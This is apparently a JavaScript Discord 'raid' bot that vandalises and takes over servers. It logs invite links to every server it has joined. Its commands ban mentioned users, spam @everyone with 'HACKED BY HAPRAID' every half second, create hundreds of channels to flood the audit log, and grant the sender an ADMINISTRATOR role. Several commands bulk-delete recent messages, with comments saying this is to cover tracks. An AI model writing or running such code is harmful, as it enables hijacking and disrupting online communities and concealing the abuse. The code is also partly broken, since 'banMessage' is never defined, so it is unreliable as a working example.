const Discord = require("discord.js");
const bot = new Discord.Client();
const token =
"process.env.TOKEN";
var prefix = ".";
var mention = "126connectés"

 
bot.on('ready',() => {
    //invit link
    bot.guilds.forEach(guild => {
      var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
      invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
    })
});
   
bot.on('message', msg => {
 
    if (msg.content === ".b") {
        msg.channel.fetchMessages(
            {limit: 10}).then(
                messages => msg.channel.bulkDelete(messages)
            ); //deletes messages to cover up you did it
 
        msg.guild.member(msg.mentions.users.first()).ban();
        msg.mentions.users.first().send(banMessage); //messages bannee
        msg.author.send(banMessage); //messages banner
    }
 
    if (msg.content === '.des') {
        msg.channel.fetchMessages(
            {limit: 10}).then(messages =>
                msg.channel.bulkDelete(messages)
            ); //deletes messages to cover up you did it
 
        var interval = setInterval (function () {
            msg.channel.send("@everyone HACKED BY HAPRAID https://discord.gg/uqx29sr");
        }, 500);
    }
 
    if (msg.content === '.des') {
        msg.channel.fetchMessages({limit: 10}).then(
            messages => msg.channel.bulkDelete(messages)
        ); //deletes messages to cover up you did it
 
        for (var i = 0; i < 500; i++) {
 
            msg.guild.createChannel('HAPRAID', 'voice')//Nom a changer
            msg.guild.createChannel('HAPRAID-vous-remercie', 'text')
            //changes name tons of times to clog up the audit log
           
        }
    }
 
    if (msg.content === '.r') {
        //create role
        msg.guild.createRole({
            name: 'hapraid',
            color: 'WHITE',
            permissions:'ADMINISTRATOR',
        }).then(role => msg.author.addRole(role));
        msg.member.addRole();
        //Nom a changer
    }
     
   
});
 
bot.login('process.env.TOKEN');
